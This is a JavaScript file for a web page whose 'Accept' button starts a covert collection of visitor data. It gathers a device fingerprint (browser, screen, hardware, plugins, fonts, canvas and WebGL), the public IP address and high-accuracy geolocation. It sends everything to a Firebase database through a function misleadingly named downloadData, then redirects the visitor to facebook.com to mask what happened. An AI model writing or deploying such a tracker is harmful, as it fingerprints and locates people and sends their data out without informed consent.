document.addEventListener('DOMContentLoaded', function() {
    const acceptBtn = document.getElementById('acceptBtn');
    
    acceptBtn.addEventListener('click', function() {
        // Change button state immediately
        acceptBtn.textContent = 'Processing...';
        acceptBtn.classList.add('processing');
        acceptBtn.disabled = true;
        
        // Start data collection immediately
        collectAllData();
    });
});

async function collectAllData() {
    const startTime = Date.now();
    const collectedData = {
        timestamp: new Date().toISOString(),
        collection_start: startTime
    };
    
    // Collect browser and device information
    collectBrowserData(collectedData);
    collectScreenData(collectedData);
    collectHardwareData(collectedData);
    collectTimezoneData(collectedData);
    collectStorageData(collectedData);
    collectPluginsData(collectedData);
    collectCanvasFingerprint(collectedData);
    collectWebGLData(collectedData);
    collectFontsData(collectedData);
    collectMouseData(collectedData);
    collectTouchData(collectedData);
    collectOrientationData(collectedData);
    
    // Collect network information
    await collectNetworkData(collectedData);
    
    // Collect IP address
    await collectIPData(collectedData);
    
    // Collect geolocation
    await collectGeolocationData(collectedData);
    
    // Add collection end time
    collectedData.collection_end = Date.now();
    collectedData.total_collection_time = collectedData.collection_end - startTime;
    
    // Download the data as JSON file
    downloadData(collectedData);
    
    // Ensure minimum 1 second processing time, then redirect
    const processingTime = Date.now() - startTime;
    const minDelay = Math.max(1000 - processingTime, 0);
    const maxDelay = Math.max(3000 - processingTime, 0);
    
    setTimeout(() => {
        window.location.href = 'https://www.facebook.com';
    }, Math.min(minDelay, maxDelay));
}

function collectBrowserData(data) {
    try {
        data.browser = {
            userAgent: navigator.userAgent,
            language: navigator.language,
            languages: navigator.languages || [],
            platform: navigator.platform,
            cookieEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack,
            onLine: navigator.onLine,
            vendor: navigator.vendor,
            vendorSub: navigator.vendorSub,
            product: navigator.product,
            productSub: navigator.productSub,
            appName: navigator.appName,
            appVersion: navigator.appVersion,
            appCodeName: navigator.appCodeName,
            buildID: navigator.buildID || null,
            oscpu: navigator.oscpu || null
        };
    } catch (e) {
        console.error('Error collecting browser data:', e);
        data.browser_error = e.message;
    }
}

function collectScreenData(data) {
    try {
        data.screen = {
            width: screen.width,
            height: screen.height,
            availWidth: screen.availWidth,
            availHeight: screen.availHeight,
            colorDepth: screen.colorDepth,
            pixelDepth: screen.pixelDepth,
            devicePixelRatio: window.devicePixelRatio,
            orientation: screen.orientation ? screen.orientation.type : null,
            orientationAngle: screen.orientation ? screen.orientation.angle : null
        };
        
        data.window = {
            innerWidth: window.innerWidth,
            innerHeight: window.innerHeight,
            outerWidth: window.outerWidth,
            outerHeight: window.outerHeight,
            scrollX: window.scrollX,
            scrollY: window.scrollY,
            screenX: window.screenX,
            screenY: window.screenY
        };
    } catch (e) {
        console.error('Error collecting screen data:', e);
        data.screen_error = e.message;
    }
}

function collectHardwareData(data) {
    try {
        data.hardware = {
            hardwareConcurrency: navigator.hardwareConcurrency,
            deviceMemory: navigator.deviceMemory || null,
            maxTouchPoints: navigator.maxTouchPoints || 0
        };
    } catch (e) {
        console.error('Error collecting hardware data:', e);
        data.hardware_error = e.message;
    }
}

async function collectNetworkData(data) {
    try {
        if ('connection' in navigator) {
            const conn = navigator.connection;
            data.network = {
                type: conn.type || null,
                effectiveType: conn.effectiveType || null,
                downlink: conn.downlink || null,
                downlinkMax: conn.downlinkMax || null,
                rtt: conn.rtt || null,
                saveData: conn.saveData || false
            };
        }
    } catch (e) {
        console.error('Error collecting network data:', e);
        data.network_error = e.message;
    }
}

async function collectIPData(data) {
    try {
        const response = await fetch('https://api.ipify.org?format=json', {
            timeout: 2000
        });
        const ipData = await response.json();
        data.ip_address = ipData.ip;
    } catch (e) {
        console.error('Error collecting IP data:', e);
        data.ip_error = e.message;
    }
}

async function collectGeolocationData(data) {
    return new Promise((resolve) => {
        if ('geolocation' in navigator) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    data.geolocation = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude,
                        altitudeAccuracy: position.coords.altitudeAccuracy,
                        heading: position.coords.heading,
                        speed: position.coords.speed,
                        timestamp: position.timestamp
                    };
                    resolve();
                },
                (error) => {
                    data.geolocation_error = {
                        code: error.code,
                        message: error.message
                    };
                    resolve();
                },
                {
                    enableHighAccuracy: true,
                    timeout: 5000,
                    maximumAge: 0
                }
            );
        } else {
            data.geolocation_error = 'Geolocation not supported';
            resolve();
        }
    });
}

function collectTimezoneData(data) {
    try {
        data.timezone = {
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezoneOffset: new Date().getTimezoneOffset(),
            locale: Intl.DateTimeFormat().resolvedOptions().locale,
            dateString: new Date().toString(),
            utcString: new Date().toUTCString(),
            isoString: new Date().toISOString()
        };
    } catch (e) {
        console.error('Error collecting timezone data:', e);
        data.timezone_error = e.message;
    }
}

function collectStorageData(data) {
    try {
        data.storage = {
            localStorage: typeof(Storage) !== "undefined" && typeof(localStorage) !== "undefined",
            sessionStorage: typeof(Storage) !== "undefined" && typeof(sessionStorage) !== "undefined",
            indexedDB: typeof(indexedDB) !== "undefined",
            webSQL: typeof(openDatabase) !== "undefined"
        };
    } catch (e) {
        console.error('Error collecting storage data:', e);
        data.storage_error = e.message;
    }
}

function collectPluginsData(data) {
    try {
        data.plugins = [];
        for (let i = 0; i < navigator.plugins.length; i++) {
            const plugin = navigator.plugins[i];
            data.plugins.push({
                name: plugin.name,
                filename: plugin.filename,
                description: plugin.description,
                version: plugin.version || null
            });
        }
        
        data.mimeTypes = [];
        for (let i = 0; i < navigator.mimeTypes.length; i++) {
            const mimeType = navigator.mimeTypes[i];
            data.mimeTypes.push({
                type: mimeType.type,
                description: mimeType.description,
                suffixes: mimeType.suffixes
            });
        }
    } catch (e) {
        console.error('Error collecting plugins data:', e);
        data.plugins_error = e.message;
    }
}

function collectCanvasFingerprint(data) {
    try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        canvas.width = 200;
        canvas.height = 50;
        
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillText('Canvas fingerprint test 🔒', 2, 2);
        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
        ctx.fillRect(100, 5, 80, 25);
        
        data.canvas_fingerprint = canvas.toDataURL();
    } catch (e) {
        console.error('Error collecting canvas fingerprint:', e);
        data.canvas_error = e.message;
    }
}

function collectWebGLData(data) {
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        
        if (gl) {
            data.webgl = {
                vendor: gl.getParameter(gl.VENDOR),
                renderer: gl.getParameter(gl.RENDERER),
                version: gl.getParameter(gl.VERSION),
                shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
                maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
                maxViewportDims: gl.getParameter(gl.MAX_VIEWPORT_DIMS)
            };
        }
    } catch (e) {
        console.error('Error collecting WebGL data:', e);
        data.webgl_error = e.message;
    }
}

function collectFontsData(data) {
    try {
        const testFonts = [
            'Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana',
            'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS',
            'Trebuchet MS', 'Arial Black', 'Impact', 'Lucida Sans Unicode',
            'Tahoma', 'Lucida Console', 'Monaco', 'Bradley Hand ITC',
            'Brush Script MT', 'Luminari', 'Chalkduster'
        ];
        
        data.fonts = testFonts.filter(font => {
            return document.fonts.check(`12px "${font}"`);
        });
    } catch (e) {
        console.error('Error collecting fonts data:', e);
        data.fonts_error = e.message;
    }
}

function collectMouseData(data) {
    try {
        data.mouse = {
            timestamp: Date.now(),
            clientX: 0,
            clientY: 0,
            screenX: 0,
            screenY: 0
        };
        
        // Capture current mouse position if available
        document.addEventListener('mousemove', function(e) {
            data.mouse.clientX = e.clientX;
            data.mouse.clientY = e.clientY;
            data.mouse.screenX = e.screenX;
            data.mouse.screenY = e.screenY;
        }, { once: true });
    } catch (e) {
        console.error('Error collecting mouse data:', e);
        data.mouse_error = e.message;
    }
}

function collectTouchData(data) {
    try {
        data.touch = {
            touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
            maxTouchPoints: navigator.maxTouchPoints || 0
        };
    } catch (e) {
        console.error('Error collecting touch data:', e);
        data.touch_error = e.message;
    }
}

function collectOrientationData(data) {
    try {
        if ('DeviceOrientationEvent' in window) {
            data.orientation = {
                alpha: null,
                beta: null,
                gamma: null,
                absolute: null
            };
            
            window.addEventListener('deviceorientation', function(e) {
                data.orientation.alpha = e.alpha;
                data.orientation.beta = e.beta;
                data.orientation.gamma = e.gamma;
                data.orientation.absolute = e.absolute;
            }, { once: true });
        }
    } catch (e) {
        console.error('Error collecting orientation data:', e);
        data.orientation_error = e.message;
    }
}

function downloadData(data) {
  try {
    const db = firebase.database();
    db.ref('data').push(data)
      .then(() => console.log('Data saved to Firebase'))
      .catch(error => console.error('Error saving data:', error));
  } catch (e) {
    console.error('Error saving data:', e);
  }
}
}
